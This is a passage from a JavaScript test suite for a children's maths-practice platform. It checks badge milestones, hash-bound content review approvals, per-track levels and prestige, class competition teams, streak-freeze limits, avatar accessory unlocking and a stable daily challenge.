    assert(codes.filter(c => badges.BADGES[c].group === "meta").length >= 3,
      "fewer than three meta badges");

    /* Distinct names, or a child collecting two identical-looking badges
       cannot tell what the second one was for. */
    const names = Object.values(badges.BADGES).map(b => b.name);
    assert(new Set(names).size === names.length,
      `${names.length - new Set(names).size} badges share a name`);

    /* Milestones within a family must be ordered: a badge for 10 rounds must
       not be earned before the one for 5. */
    const famAt = (prefix, n, stats) => badges.BADGES[`${prefix}_${n}`].when(stats);
    assert(famAt("rounds", 5, { rounds: 5 }) && !famAt("rounds", 10, { rounds: 5 }),
      "round milestones are not ordered");
    assert(!famAt("points", 1000, { points: 999 }) && famAt("points", 1000, { points: 1000 }),
      "a points milestone fires on the wrong side of its own boundary");

    /* Earned from the record, so they apply retroactively. */
    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "badges@b.com", password: "a-long-enough-pass", name: "B" });
    const kid = (await post(c, "/learners", { name: "Badge Kid" })).body.learner;
    for (let i = 0; i < 6; i++)
      await post(c, "/runs", { learnerId: kid.id, topicId: "g6-ratios", tier: "practice", score: 8, total: 8 });

    const held = (await c(`/learners/${kid.id}/rewards`)).body.badges.map(b => b.code);
    assert(held.includes("first_steps"), "the first badge was not awarded");
    assert(held.includes("rounds_5"), `six rounds did not earn the 5-round badge (held: ${held.join(", ")})`);
    assert(held.includes("perfect_5"), "five perfect rounds did not earn the perfect-round milestone");
    assert(!held.includes("rounds_100"), "a badge was awarded for work that has not been done");

    /* Every badge held renders with a name rather than a raw code. */
    for (const b of (await c(`/learners/${kid.id}/rewards`)).body.badges)
      assert(b.name && b.name !== b.code, `badge ${b.code} renders without a name`);

    /* Awarded once. Running the engine again must add nothing. */
    const before = held.length;
    const again = rewards.evaluateBadges(kid.id, rewards.award, { streak: 1 });
    assert(again.length === 0, `re-evaluating awarded ${again.length} duplicate badges`);
    const after = (await c(`/learners/${kid.id}/rewards`)).body.badges.length;
    assert(after === before, `badge count changed from ${before} to ${after} on re-evaluation`);

    return `${codes.length} badges in ${groups.size} groups, every one reachable and every awardable code catalogued, milestones ordered, earned from the record so they apply retroactively, and awarded once`;
  },

  /* 8.5 / 3.5.5 — content signed off against the exact version reviewed. */
  "content-review-workflow": async () => {
    const review = await import("../app/server/src/review.js");
    const { QUESTIONS } = await import("../app/shared/questions.mjs");

    /* The hash is what makes an approval mean something, so its behaviour is
       pinned first: stable under reformatting, sensitive to meaning. */
    const bank = [{ q: "2+2?", ans: 4, expl: "Add them." }];
    assert(review.contentHash(bank) === review.contentHash([{ expl: "Add them.", ans: 4, q: "2+2?" }]),
      "reordering fields changes the hash, so reformatting the source would revoke every approval");
    for (const changed of [
      [{ q: "2+3?", ans: 4, expl: "Add them." }],
      [{ q: "2+2?", ans: 5, expl: "Add them." }],
      [{ q: "2+2?", ans: 4, expl: "Different reasoning." }],
      [{ q: "2+2?", ans: 4, expl: "Add them." }, { q: "3+3?", ans: 6, expl: "Add." }]
    ]) assert(review.contentHash(bank) !== review.contentHash(changed),
      `a meaningful change did not change the hash: ${JSON.stringify(changed).slice(0, 60)}`);

    const c = client();
    const admin = { email: "boss@b.com", password: "a-long-enough-pass" };
    const reg = await post(c, "/auth/register", { coppaConsent: true, name: "Admin", ...admin });
    if (reg.status !== 200) await post(c, "/auth/login", admin);

    const topic = "g6-ratios";
    /* Preview shows what a child sees, built from the same function the
       learner endpoints use. */
    const preview = await c(`/admin/content/${topic}/preview`);
    assert(preview.status === 200, `preview failed (${preview.status})`);
    assert(preview.body.count === QUESTIONS[topic].length, "the preview does not cover the whole bank");
    assert(preview.body.leakCheck === true, "the student preview contains answer fields");
    const studentRaw = JSON.stringify(preview.body.asStudent);
    for (const leak of ['"ans"', '"expl"', '"ansP"', '"aMulti"'])
      assert(!studentRaw.includes(leak), `the student view leaked ${leak}`);
    /* The reviewer still gets the answers, deliberately and separately. */
    assert(preview.body.answers.length === preview.body.count && preview.body.answers[0].explanation,
      "the reviewer cannot see the answers they are meant to be checking");

    /* Unreviewed until someone reviews it. */
    assert(preview.body.review.state === "unreviewed",
      `a never-reviewed topic reports as ${preview.body.review.state}`);

    const bad = await post(c, `/admin/content/${topic}/review`, { status: "looks-fine" });
    assert(bad.status === 400, "an unrecognised review status was accepted");

    const approve = await post(c, `/admin/content/${topic}/review`,
      { status: "approved", notes: "Checked against the scheme of work." });
    assert(approve.status === 200 && approve.body.status.state === "approved",
      `approval did not take (${approve.status}, ${JSON.stringify(approve.body.status)})`);

    /* THE property. An approval recorded against a topic id alone survives
       every later edit, so a bank approved in March still reads as approved
       after a June rewrite nobody checked — which is worse than no approval,
       because it looks like assurance. Editing the content must invalidate
       the sign-off. */
    const original = QUESTIONS[topic];
    const edited = [...original,
      { sec: original[0].sec, type: "in", q: "Newly added, unreviewed?", ans: 1, expl: "..." }];

    /* Evaluated against the edited bank directly rather than by mutating the
       shared module: the server holds its own copy of the content in its own
       process, so changing it here would prove nothing about what the server
       reports. statusFor takes the bank as an argument precisely so the
       question "is THIS version approved?" can be asked of any version. */
    const stale = review.statusFor(topic, edited);
    assert(stale.state === "stale",
      `an edited bank reports ${stale.state}, so the old approval carried forward onto content nobody reviewed`);
    assert(stale.reviewedHash && stale.reviewedHash !== stale.hash,
      "the stale state does not record which version was actually approved");
    assert(/changed since/.test(stale.message || ""), "the stale state does not explain itself");

    /* The record of who approved what is kept, not overwritten. */
    const history = review.historyFor(topic);
    assert(history.length >= 1 && history[0].content_hash === review.contentHash(original),
      "the approval history does not retain the version that was signed off");

    /* And the unchanged content is still approved — the sign-off is about the
       content, not about the clock. */
    const restored = await c(`/admin/content/${topic}/review`);
    assert(restored.body.status.state === "approved",
      `the unchanged approved content reports as ${restored.body.status.state}`);

    /* Changes requested is a distinct outcome, not a silent non-approval. */
    await post(c, `/admin/content/${topic}/review`,
      { status: "changes_requested", notes: "Question 3 gives the answer away." });
    const rejected = await c(`/admin/content/${topic}/review`);
    assert(rejected.body.status.state === "changes_requested",
      "requesting changes left the topic looking approved");
    assert(rejected.body.status.notes, "the reviewer's notes were not kept");

    /* A whole-estate view: what is approved, what nobody has looked at, and
       what has drifted since. */
    const overview = await c("/admin/content/review-status");
    assert(overview.status === 200 && overview.body.total > 0, "the review overview is empty");
    assert(typeof overview.body.tally.unreviewed === "number",
      "the overview does not report how much content has never been reviewed");

    /* The record outlives the reviewer's account.

       reviewer_id cascaded on users(id), so deleting the account of someone
       who had signed off 40 topics deleted all 40 approvals with it, and
       every one of those topics silently reverted to "never reviewed" — the
       exact record this table exists to hold. Erasing a person is a request
       this product honours; erasing the fact that a review happened is a
       different request nobody made. */
    const { DatabaseSync: DBrev } = await import("node:sqlite");
    const { randomUUID: uuid } = await import("node:crypto");
    const revDb = new DBrev("app/server/data/verify.db");
    const ghost = uuid();
    revDb.prepare(`INSERT INTO users (id, email, pass_hash, pass_salt, name, role, created_at)
                   VALUES (?,?,?,?,?,?,?)`)
      .run(ghost, `ghost-${ghost}@b.com`, "x", "y", "Departing Reviewer", "admin", new Date().toISOString());
    revDb.prepare(`INSERT INTO content_reviews (id, topic_id, content_hash, status, reviewer_id, notes, at)
                   VALUES (?,?,?,?,?,?,?)`)
      .run(uuid(), "g6-percent", "deadbeef", "approved", ghost, "signed off before leaving",
           new Date().toISOString());
    const beforeDelete = revDb.prepare("SELECT COUNT(*) c FROM content_reviews WHERE topic_id='g6-percent'").get().c;
    revDb.prepare("PRAGMA foreign_keys = ON").run();
    revDb.prepare("DELETE FROM users WHERE id=?").run(ghost);
    const afterDelete = revDb.prepare("SELECT COUNT(*) c FROM content_reviews WHERE topic_id='g6-percent'").get().c;
    assert(afterDelete === beforeDelete,
      `deleting the reviewer's account destroyed ${beforeDelete - afterDelete} approval record(s) — the sign-off history goes with whoever leaves`);
    assert(revDb.prepare("SELECT reviewer_id FROM content_reviews WHERE topic_id='g6-percent'").get().reviewer_id === null,
      "the departed reviewer is still named on the record rather than detached from it");

    /* Admin only: content sign-off is an editorial authority, not a setting. */
    const outsider = client();
    await post(outsider, "/auth/register",
      { coppaConsent: true, email: "review-outsider@b.com", password: "a-long-enough-pass", name: "O" });
    assert((await outsider(`/admin/content/${topic}/preview`)).status === 403,
      "a non-admin previewed unreleased content with its answers");
    assert((await post(outsider, `/admin/content/${topic}/review`, { status: "approved" })).status === 403,
      "a non-admin approved content");

    return `approvals bound to a hash of the exact content: reformatting keeps a sign-off, any change of meaning revokes it and the topic reports as stale with the version that was approved, history survives the reviewer's account being deleted, preview built from the same code learners are served, admin only`;
  },

  /* 5.4 — levels per subject, and prestige on the advanced track. */
  "levels-and-prestige": async () => {
    const rewards = await import("../app/server/src/rewards.js");
    const { db } = await import("../app/server/src/db.js");
    const { randomUUID } = await import("node:crypto");

    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "levels@b.com", password: "a-long-enough-pass", name: "L" });
    const kid = (await post(c, "/learners", { name: "Level Kid" })).body.learner;

    const givePoints = (amount, track) =>
      db.prepare("INSERT INTO awards (id, learner_id, kind, code, amount, at, track) VALUES (?,?,?,?,?,?,?)")
        .run(randomUUID(), kid.id, "points", "test", amount, new Date().toISOString(), track);

    /* Nothing earned means level 1 in both, and no prestige. */
    const cold = rewards.bySubject(kid.id);
    assert(cold.core.level === 1 && cold.adv.level === 1, "a new learner does not start at level 1");
    assert(cold.core.prestige === 0 && cold.adv.prestige === 0, "a new learner already has prestige");

    /* THE separation: core points must not raise the advanced level. One
       number for both would tell a child their competition standing had gone
       up because they did their times tables. */
    givePoints(5000, "core");
    const afterCore = rewards.bySubject(kid.id);
    assert(afterCore.core.level > 1, `core points did not raise the core level (${afterCore.core.level})`);
    assert(afterCore.adv.level === 1,
      `core points raised the advanced level to ${afterCore.adv.level} — the subjects are pooled`);
    assert(afterCore.adv.points === 0, `advanced shows ${afterCore.adv.points} points earned on core work`);

    /* Prestige is for the advanced track only, as the spec asks. */
    givePoints(5000, "adv");
    const both = rewards.bySubject(kid.id);
    assert(both.adv.points === 5000, `advanced points are ${both.adv.points}`);
    assert(both.core.prestige === 0, "the core track was given prestige");
    assert(both.core.levelCap === null && both.adv.levelCap === rewards.LEVEL_CAP,
      "the level cap is not reported for the advanced track only");

    /* Passing the cap converts into prestige rather than an ever-growing
       number, and the displayed level wraps within the cap. */
    givePoints(500000, "adv");
    const high = rewards.bySubject(kid.id);
    assert(high.adv.prestige >= 1,
      `${high.adv.points} advanced points gave prestige ${high.adv.prestige}`);
    assert(high.adv.level >= 1 && high.adv.level <= rewards.LEVEL_CAP,
      `the displayed advanced level is ${high.adv.level}, outside 1..${rewards.LEVEL_CAP}`);

    /* Prestige is DERIVED, not stored: recomputing must give the same answer,
       and there is no second record of it to drift from the level. */
    const again = rewards.bySubject(kid.id);
    assert(again.adv.prestige === high.adv.prestige && again.adv.level === high.adv.level,
      "recomputing gave a different prestige — it is being stored somewhere as well as derived");
    const cols = db.prepare("PRAGMA table_info(awards)").all().map(c => c.name);
    assert(cols.includes("track"), "points are not attributed to a track at all");

    /* Points earned through a real round are attributed to that round's
       track, not left unassigned. */
    const before = rewards.bySubject(kid.id).core.points;
    await post(c, "/runs", { learnerId: kid.id, topicId: "g6-ratios", tier: "practice", score: 8, total: 8 });
    assert(rewards.bySubject(kid.id).core.points > before,
      "points from a core round were not attributed to the core track");

    /* And it reaches the learner. */
    const view = (await c(`/learners/${kid.id}/rewards`)).body;
    assert(view.subjects && view.subjects.core && view.subjects.adv,
      "per-subject levels are not reported to the learner");
    assert(typeof view.subjects.adv.prestige === "number", "prestige is not reported");

    return `levels held per subject so core work cannot raise an advanced standing, prestige derived from the advanced level rather than stored beside it, cap ${rewards.LEVEL_CAP}, and round points attributed to the track they were earned on`;
  },

  /* 4.3.5 — competition teams within a class. */
  "competition-teams": async () => {
    const { DatabaseSync } = await import("node:sqlite");
    const { randomUUID } = await import("node:crypto");
    const db = new DatabaseSync("app/server/data/verify.db");

    const teacher = client();
    await post(teacher, "/auth/register",
      { coppaConsent: true, email: "teamteacher@b.com", password: "a-long-enough-pass", name: "T", role: "teacher" });
    const cls = await post(teacher, "/classes", { name: "Squad Class" });
    assert(cls.status === 200, `class creation failed (${cls.status})`);
    const classId = cls.body.class.id, joinCode = cls.body.class.joinCode;

    const join = async (email, name) => {
      const c = client();
      await post(c, "/auth/register", { coppaConsent: true, email, password: "a-long-enough-pass", name: "P" });
      const kid = (await post(c, "/learners", { name })).body.learner;
      await post(c, "/classes/join", { joinCode, learnerId: kid.id });
      return { c, kid };
    };
    const a = await join("tm-a@b.com", "Alpha");
    const b = await join("tm-b@b.com", "Bravo");
    const solo = await join("tm-c@b.com", "Solo");

    const red = await post(teacher, `/classes/${classId}/teams`, { name: "Red" });
    const blue = await post(teacher, `/classes/${classId}/teams`, { name: "Blue" });
    assert(red.status === 200 && blue.status === 200, "team creation failed");

    assert((await post(teacher, `/teams/${red.body.team.id}/members`, { learnerId: a.kid.id })).status === 200,
      "adding a class member to a team failed");
    assert((await post(teacher, `/teams/${red.body.team.id}/members`, { learnerId: b.kid.id })).status === 200,
      "adding a second member failed");
    assert((await post(teacher, `/teams/${blue.body.team.id}/members`, { learnerId: solo.kid.id })).status === 200,
      "adding a member to the second team failed");

    /* A learner belongs to at most one team. Two teams sharing a member would
       count that child's paper twice and rank both squads on work only one of
       them did. */
    const poach = await post(teacher, `/teams/${blue.body.team.id}/members`, { learnerId: a.kid.id });
    assert(poach.status === 409,
      `a learner was added to a second team (${poach.status}) — their score would be counted twice`);

    /* A child from outside the class cannot be entered into its squad. */
    const outFamily = client();
    await post(outFamily, "/auth/register",
      { coppaConsent: true, email: "tm-out@b.com", password: "a-long-enough-pass", name: "O" });
    const outKid = (await post(outFamily, "/learners", { name: "Outsider" })).body.learner;
    assert((await post(teacher, `/teams/${red.body.team.id}/members`, { learnerId: outKid.id })).status === 400,
      "a learner from outside the class was entered into its team");

    /* One team per learner PER CLASS, not per platform.

       A learner is commonly in more than one class, and each teacher picks
       their own squads. Enforced platform-wide, whichever teacher acted first
       locked every other one out: the second got "already on a team, remove
       them first" for a team in a class they cannot see, on a learner they
       cannot remove — `DELETE /teams/:id/members/:learnerId` checks ownership
       of the OTHER teacher's class and returns 403. The child was simply
       excluded from their second class's teams for good. */
    const teacher2 = client();
    await post(teacher2, "/auth/register",
      { coppaConsent: true, email: "teamteacher2@b.com", password: "a-long-enough-pass", name: "T2", role: "teacher" });
    const cls2 = await post(teacher2, "/classes", { name: "Enrichment Class" });
    assert(cls2.status === 200, `second class creation failed (${cls2.status})`);
    /* The SAME learner joins the second class, as a child in two classes does. */
    assert((await post(a.c, "/classes/join",
      { joinCode: cls2.body.class.joinCode, learnerId: a.kid.id })).status === 200,
      "a learner could not join a second class");

    const green = await post(teacher2, `/classes/${cls2.body.class.id}/teams`, { name: "Green" });
    assert(green.status === 200, "team creation in the second class failed");
    const second = await post(teacher2, `/teams/${green.body.team.id}/members`, { learnerId: a.kid.id });
    assert(second.status === 200,
      `a learner already on a team in another class was refused entry to their second class's team (${second.status}) — the second teacher cannot undo the first one's pick`);
    /* And the rule still holds within that class. */
    const lime = await post(teacher2, `/classes/${cls2.body.class.id}/teams`, { name: "Lime" });
    assert((await post(teacher2, `/teams/${lime.body.team.id}/members`, { learnerId: a.kid.id })).status === 409,
      "a learner was added to two teams within the SAME class");

    /* Papers, so the standings have something to rank. */
    const paper = (learnerId, pct, seconds) =>
      db.prepare(`INSERT INTO contests (id, learner_id, format, score, total, pct, seconds, limit_secs, expired, detail, finished_at)
                  VALUES (?,?,?,?,?,?,?,?,0,?,?)`)
        .run(randomUUID(), learnerId, "sprint", pct, 100, pct, seconds, 600, "[]", new Date().toISOString());
    paper(a.kid.id, 90, 300);
    paper(a.kid.id, 40, 100);   // a worse earlier paper, which must not be the one counted
    paper(b.kid.id, 70, 300);
    paper(solo.kid.id, 95, 300);

    const standings = (await teacher(`/classes/${classId}/teams?format=sprint`)).body.teams;
    const redRow = standings.find(t => t.name === "Red");
    const blueRow = standings.find(t => t.name === "Blue");

    /* Best paper per member, summed. */
    assert(redRow.totalPct === 160, `Red totals ${redRow.totalPct}, expected 90 + 70 = 160`);
    assert(blueRow.totalPct === 95, `Blue totals ${blueRow.totalPct}`);
    assert(standings[0].name === "Red", `the standings are led by ${standings[0].name}`);

    /* Both the sum and the average are reported, with the squad size.

       A sum rewards the bigger team and an average rewards the smaller one;
       publishing only one hides whichever unfairness it carries behind a
       figure a teacher cannot interrogate. Blue's single 95 beats Red's
       average of 80, and both facts have to be visible. */
    assert(redRow.size === 2 && blueRow.size === 1, "team sizes are not reported");
    assert(redRow.averagePct === 80, `Red averages ${redRow.averagePct}, expected 80`);
    assert(blueRow.averagePct === 95, `Blue averages ${blueRow.averagePct}`);
    assert(blueRow.averagePct > redRow.averagePct && redRow.totalPct > blueRow.totalPct,
      "the fixture no longer shows the sum and the average disagreeing");

    /* Removing a member changes the standings. */
    assert((await teacher(`/teams/${red.body.team.id}/members/${b.kid.id}`, { method: "DELETE" })).status === 200,
      "removing a team member failed");
    const after = (await teacher(`/classes/${classId}/teams?format=sprint`)).body.teams;
    assert(after.find(t => t.name === "Red").totalPct === 90,
      "the standings did not follow the removal");

    /* Names follow the same rule as every other board: hidden unless the
       teacher allows them, with a parent always seeing their own child. */
    const parentView = (await a.c(`/classes/${classId}/teams`)).body.teams;
    const names = JSON.stringify(parentView);
    assert(names.includes("Alpha"), "a parent cannot see their own child on the team sheet");
    assert(!names.includes("Solo"), "another family's child is named on an unanonymised team sheet");
    await teacher(`/classes/${classId}/settings`,
      { method: "PUT", body: JSON.stringify({ leaderboardOn: true, displayNames: true }) });
    assert(JSON.stringify((await a.c(`/classes/${classId}/teams`)).body).includes("Solo"),
      "names stay hidden after the teacher allowed them");

    /* Only this class's teacher manages its teams, and outsiders see nothing. */
    const otherTeacher = client();
    await post(otherTeacher, "/auth/register",
      { coppaConsent: true, email: "tm-otherteacher@b.com", password: "a-long-enough-pass", name: "OT", role: "teacher" });
    assert((await post(otherTeacher, `/teams/${red.body.team.id}/members`, { learnerId: solo.kid.id })).status === 403,
      "another teacher altered someone else's team");
    assert((await outFamily(`/classes/${classId}/teams`)).status === 403,
      "a family outside the class read its team sheet");

    return "teams within a class, one team per learner enforced by the schema so no paper is counted twice, outsiders refused, standings on best papers with sum and average both published alongside squad size, names anonymised by the class's own setting";
  },

  /* 5.5 — streaks that survive one missed day, without becoming unbreakable. */
  "streak-freezes": async () => {
    const rewards = await import("../app/server/src/rewards.js");
    const { db } = await import("../app/server/src/db.js");
    const { randomUUID } = await import("node:crypto");

    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "freeze@b.com", password: "a-long-enough-pass", name: "F" });
    const kid = (await post(c, "/learners", { name: "Freeze Kid" })).body.learner;

    const DAY = 86400000;
    const key = ms => new Date(ms).toISOString().slice(0, 10);
    const todayMs = Date.now();
    const activity = daysAgo =>
      db.prepare("INSERT INTO awards (id, learner_id, kind, code, amount, at) VALUES (?,?,?,?,?,?)")
        .run(randomUUID(), kid.id, "points", "practice", 10,
             new Date(todayMs - daysAgo * DAY).toISOString());

    /* A plain unbroken run still counts the ordinary way. */
    for (const d of [0, 1, 2]) activity(d);
    assert(rewards.streak(kid.id) === 3, `three consecutive days gave a streak of ${rewards.streak(kid.id)}`);

    /* A gap breaks it when there is nothing to protect it. */
    const gapKid = (await post(c, "/learners", { name: "Gap Kid" })).body.learner;
    const gapActivity = daysAgo =>
      db.prepare("INSERT INTO awards (id, learner_id, kind, code, amount, at) VALUES (?,?,?,?,?,?)")
        .run(randomUUID(), gapKid.id, "points", "practice", 10,
             new Date(todayMs - daysAgo * DAY).toISOString());
    for (const d of [0, 2, 3]) gapActivity(d);   // yesterday missed
    assert(rewards.streak(gapKid.id) === 1,
      `a missed day should end the run at 1, got ${rewards.streak(gapKid.id)}`);

    /* With a freeze available, activity today spends it on yesterday and the
       run continues across the gap. */
    assert(rewards.freezeBalance(gapKid.id) === 0, "the fixture starts with a freeze");
    const noneToUse = rewards.useFreezeIfNeeded(gapKid.id);
    assert(noneToUse.used === false, "a freeze was spent from an empty balance");

    db.prepare("INSERT INTO streak_freezes (id, learner_id, earned_at) VALUES (?,?,?)")
      .run(randomUUID(), gapKid.id, new Date().toISOString());
    const used = rewards.useFreezeIfNeeded(gapKid.id);
    assert(used.used === true, `a freeze was not spent on the missed day: ${used.reason}`);
    assert(used.day === key(todayMs - DAY), `the freeze was spent on ${used.day}, not yesterday`);
    assert(rewards.streak(gapKid.id) === 3,
      `the protected run should be 3 days of practice, got ${rewards.streak(gapKid.id)}`);

    /* Spent freezes are recorded against their day, so the same token cannot
       cover a second gap later. */
    assert(rewards.freezeBalance(gapKid.id) === 0, "the freeze was not consumed");
    const again = rewards.useFreezeIfNeeded(gapKid.id);
    assert(again.used === false, "a spent freeze was spent again");

    /* THE limit. A freeze covers ONE missed day at the moment of activity; it
       cannot be applied retroactively across a long absence. A learner
       returning after a fortnight has a broken streak, and that is the honest
       answer — otherwise one token repairs a month and the number stops
       meaning anything. */
    const lapsed = (await post(c, "/learners", { name: "Lapsed Kid" })).body.learner;
    for (const d of [0, 14, 15, 16])
      db.prepare("INSERT INTO awards (id, learner_id, kind, code, amount, at) VALUES (?,?,?,?,?,?)")
        .run(randomUUID(), lapsed.id, "points", "practice", 10, new Date(todayMs - d * DAY).toISOString());
    db.prepare("INSERT INTO streak_freezes (id, learner_id, earned_at) VALUES (?,?,?)")
      .run(randomUUID(), lapsed.id, new Date().toISOString());
    const cannot = rewards.useFreezeIfNeeded(lapsed.id);
    assert(cannot.used === false,
      "a freeze bridged a fortnight-long absence — one token must not repair an arbitrary gap");
    assert(rewards.streak(lapsed.id) === 1,
      `a learner returning after two weeks has a streak of ${rewards.streak(lapsed.id)}, not 1`);

    /* The balance is capped, or a hard month banks an unbreakable streak. */
    const hoard = (await post(c, "/learners", { name: "Hoard Kid" })).body.learner;
    for (let i = 0; i < 10; i++)
      db.prepare("INSERT INTO streak_freezes (id, learner_id, earned_at) VALUES (?,?,?)")
        .run(randomUUID(), hoard.id, new Date().toISOString());
    const before = rewards.freezeBalance(hoard.id);
    rewards.grantFreezes(hoard.id);
    assert(rewards.freezeBalance(hoard.id) === before,
      "more freezes were granted to a learner already over the cap");
    assert(rewards.MAX_FREEZES <= 3,
      `the cap is ${rewards.MAX_FREEZES}, high enough to make a streak effectively unbreakable`);

    /* Earning is scoped to the CURRENT streak, not to a lifetime total.

       Counted over a lifetime, the entitlement ratchets: a learner who earns
       two freezes, spends them, then breaks their streak needs 21 unbroken
       days for the next one, then 28, then 35 — while the rule they were told
       is one a week. This learner has spent two and is seven days into a new
       run, so exactly one is due. */
    const restart = (await post(c, "/learners", { name: "Restart Kid" })).body.learner;
    for (let d = 0; d < 7; d++)
      db.prepare("INSERT INTO awards (id, learner_id, kind, code, amount, at) VALUES (?,?,?,?,?,?)")
        .run(randomUUID(), restart.id, "points", "practice", 10, new Date(todayMs - d * DAY).toISOString());
    /* Two earned and spent during an OLDER run, long before this one began. */
    for (let i = 0; i < 2; i++)
      db.prepare(`INSERT INTO streak_freezes (id, learner_id, earned_at, spent_on, spent_at)
                  VALUES (?,?,?,?,?)`)
        .run(randomUUID(), restart.id, new Date(todayMs - 60 * DAY).toISOString(),
             key(todayMs - 55 * DAY), new Date(todayMs - 55 * DAY).toISOString());

    assert(rewards.streak(restart.id) === 7, `expected a 7-day run, got ${rewards.streak(restart.id)}`);
    const regrant = rewards.grantFreezes(restart.id);
    assert(regrant.granted === 1,
      `a full week of a fresh streak granted ${regrant.granted} freezes — spent freezes from an older run are still counted against the new one`);

    /* Surfaced to the learner, and scoped to their own family. */
    const view = (await c(`/learners/${kid.id}/rewards`)).body;
    assert(view.freezes && typeof view.freezes.balance === "number" && view.freezes.max === rewards.MAX_FREEZES,
      "the freeze balance is not reported to the learner");

    return `a missed day ends a streak, one freeze bridges exactly one missed day at the moment of activity and is recorded against it, a fortnight's absence cannot be repaired, earning rebases on the current run rather than a lifetime total, and the balance is capped at ${rewards.MAX_FREEZES}`;
  },

  /* 5.3 / 5.7 / 4.1.2 — accessories earned by achievement, and a daily
     challenge that is the same for everyone and cannot be re-rolled. */
  "avatar-and-daily": async () => {
    const avatar = await import("../app/server/src/avatar.js");
    const dailyMod = await import("../app/server/src/daily.js");
    const { QUESTIONS } = await import("../app/shared/questions.mjs");

    /* Every accessory unlocks from a real badge — an item whose requirement
       does not exist is one a child can never earn. Enforced at import, so
       reaching here at all is part of the proof. */
    const { BADGES } = await import("../app/server/src/rewards.js");
    for (const [id, item] of Object.entries(avatar.ACCESSORIES))
      assert(BADGES[item.badge], `accessory ${id} requires a badge that does not exist`);
    assert(Object.keys(avatar.ACCESSORIES).length >= 8,
      `only ${Object.keys(avatar.ACCESSORIES).length} accessories`);

    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "avatar@b.com", password: "a-long-enough-pass", name: "A" });
    const kid = (await post(c, "/learners", { name: "Avatar Kid" })).body.learner;

    /* Locked items are listed, not hidden — the collection is pointless if a
       child cannot see what they have not got — and each names what earns it. */
    const start = (await c(`/learners/${kid.id}/avatar`)).body.wardrobe;
    assert(start.items.length === Object.keys(avatar.ACCESSORIES).length,
      "locked accessories are hidden, so the collection is invisible until it is already complete");
    assert(start.unlockedCount === 0, `a new learner already has ${start.unlockedCount} accessories`);
    for (const item of start.items) {
      assert(item.unlockedBy && item.unlockHint,
        `${item.id} does not say what unlocks it, leaving an unexplained locked slot`);
      assert(item.unlocked === false, `${item.id} is unlocked before any badge was earned`);
    }

    /* THE authorisation property: an unearned accessory cannot be worn by
       asking for it. Without this a learner could post the contest sash's id
       and every badge on display would stop meaning anything. */
    const steal = await c(`/learners/${kid.id}/avatar/contest_sash`,
      { method: "PUT", body: JSON.stringify({ equipped: true }) });
    assert(steal.status === 403, `an unearned accessory was equipped (${steal.status})`);
    assert(/Contest Ready/.test(JSON.stringify(steal.body)),
      "the refusal does not name the badge that would earn it");
    assert((await c(`/learners/${kid.id}/avatar/not_a_real_item`,
      { method: "PUT", body: JSON.stringify({ equipped: true }) })).status === 404,
      "an accessory that does not exist was accepted");

    /* Earn a badge the honest way, and the matching item unlocks. */
    await post(c, "/runs", { learnerId: kid.id, topicId: "g6-ratios", tier: "practice", score: 8, total: 8 });
    const earned = (await c(`/learners/${kid.id}/avatar`)).body.wardrobe;
    assert(earned.unlockedCount > 0,
      "finishing a perfect first round unlocked nothing, so accessories are not tied to achievement at all");
    const openItem = earned.items.find(i => i.unlocked);
    const wear = await c(`/learners/${kid.id}/avatar/${openItem.id}`,
      { method: "PUT", body: JSON.stringify({ equipped: true }) });
    assert(wear.status === 200, `an earned accessory could not be equipped (${wear.status})`);
    assert(wear.body.wardrobe.items.find(i => i.id === openItem.id).equipped === true,
      "the accessory did not stay on");

    /* One item per slot: a second hat replaces the first rather than stacking. */
    const sameSlot = earned.items.filter(i => i.unlocked && i.slot === openItem.slot && i.id !== openItem.id);
    if (sameSlot.length) {
      await c(`/learners/${kid.id}/avatar/${sameSlot[0].id}`,
        { method: "PUT", body: JSON.stringify({ equipped: true }) });
      const after = (await c(`/learners/${kid.id}/avatar`)).body.wardrobe;
      const worn = after.items.filter(i => i.equipped && i.slot === openItem.slot);
      assert(worn.length === 1, `${worn.length} items are worn in the ${openItem.slot} slot`);
    }

    /* Another family cannot dress this learner. */
    const outsider = client();
    await post(outsider, "/auth/register",
      { coppaConsent: true, email: "avatar-outsider@b.com", password: "a-long-enough-pass", name: "O" });
    assert((await outsider(`/learners/${kid.id}/avatar`)).status === 403,
      "another account read this learner's wardrobe");

    /* ---- challenge of the day ---- */

    /* The same for everyone on a given day, and stable when asked twice. A
       random pick would let a child reload until they got an easy one. */
    for (const key of ["2026-01-01", "2026-06-15", "2027-03-09"]) {
      const a = dailyMod.challengeFor(key, QUESTIONS);
      const b = dailyMod.challengeFor(key, QUESTIONS);
      assert(a && b && a.topicId === b.topicId && a.idx === b.idx,
        `${key} produced two different challenges — it can be re-rolled by reloading`);
      assert(QUESTIONS[a.topicId] && QUESTIONS[a.topicId][a.idx],
        `${key} selected a question that does not exist`);
    }
    const distinct = new Set(["2026-01-01", "2026-01-02", "2026-01-03", "2026-01-04", "2026-01-05"]
      .map(k => { const p = dailyMod.challengeFor(k, QUESTIONS); return `${p.topicId}#${p.idx}`; }));
    assert(distinct.size >= 4, `five consecutive days gave only ${distinct.size} different challenges`);

    /* Stable across a change of content, which the raw derivation is not.

       The pick is an index modulo the number of banks, so publishing content
       reshuffles every past date too — authoring went from 16 banks to 147 in
       one stretch of work, silently rewriting what every previous day's
       challenge had been, and a deploy landing at lunchtime hands the
       afternoon a different question from the morning while the attempt row
       still says the day is done. So the day's pick is decided once and
       remembered; here the banks change underneath it and it must not move. */
    const pinKey = "2026-04-04";
    const firstPick = dailyMod.resolveChallenge(pinKey, QUESTIONS);
    assert(firstPick, "no challenge could be resolved");
    const shrunk = Object.fromEntries(Object.entries(QUESTIONS).slice(0, 8));
    const grown = { ...QUESTIONS, "zz-brand-new-bank": QUESTIONS["g6-ratios"] };
    for (const [label, banks] of [["a smaller", shrunk], ["a larger", grown]]) {
      const again = dailyMod.resolveChallenge(pinKey, banks);
      /* Only meaningful while the remembered pick still exists in the banks
         on offer; a deleted topic is allowed to fall back to a fresh pick. */
      if (banks[firstPick.topicId]?.[firstPick.idx])
        assert(again.topicId === firstPick.topicId && again.idx === firstPick.idx,
          `${label} question bank changed what ${pinKey}'s challenge had been: ${firstPick.topicId}#${firstPick.idx} became ${again.topicId}#${again.idx}`);
    }

    const today = (await c(`/learners/${kid.id}/today`)).body;
    assert(today.challenge && today.challenge.question, "no challenge was served");
